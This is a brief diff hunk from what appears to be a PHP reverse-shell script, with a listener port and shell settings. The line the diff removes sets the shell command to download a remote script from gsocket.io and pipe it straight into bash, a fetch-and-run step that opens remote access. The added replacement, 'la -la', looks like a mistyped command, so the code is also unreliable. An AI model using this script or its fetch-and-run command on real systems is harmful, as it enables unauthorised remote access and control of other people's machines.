@@ -7,7 +7,7 @@ $port = 12334;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'bash -c "$(curl -fsSL https://gsocket.io/y)"';
+$shell = 'la -la';
 $daemon = 0;
 $debug = 0;
 
